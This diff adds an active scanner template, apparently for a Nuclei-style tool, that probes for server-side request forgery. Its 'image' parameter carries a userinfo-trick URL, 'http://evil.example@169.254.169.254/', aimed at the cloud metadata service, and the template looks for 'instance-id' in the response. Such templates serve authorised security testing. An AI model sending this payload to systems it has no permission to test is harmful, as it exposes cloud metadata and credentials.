@@ -1,0 +1,22 @@
+id: patt-ssrf-userinfo-01-image
+name: 'PATT ssrf patt-ssrf-userinfo-01 via image'
+severity: high
+type: active
+tags:
+  - ssrf
+  - patt
+  - encodeuserinfo
+description: 'PATT URL parsing discrepancy: userinfo @. [patt:patt-ssrf-userinfo-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      image:
+        - 'http://evil.example@169.254.169.254/'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'ami-id'
+          - 'instance-id'
+          - 'metadata'
